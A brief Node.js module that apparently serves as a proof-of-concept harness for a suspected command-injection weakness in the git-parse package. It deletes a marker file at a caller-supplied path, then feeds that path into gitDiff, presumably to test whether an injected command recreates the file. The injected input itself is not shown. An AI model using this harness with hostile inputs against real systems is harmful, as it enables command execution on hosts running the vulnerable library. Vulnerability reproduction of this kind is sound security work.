function exploitFunction(paths) {
    const x = require("git-parse");
    const fs = require("fs");

    try {
        if (fs.existsSync(paths.path)) {
            fs.unlinkSync(paths.path);
            console.log("File removed:", paths.path);
        }
    } catch (err) {
        console.error(err);
    }

    const file_exist = fs.existsSync(paths.path);

    return x.gitDiff(".", 445454, 1545, paths.path);
}

module.exports = { exploitFunction };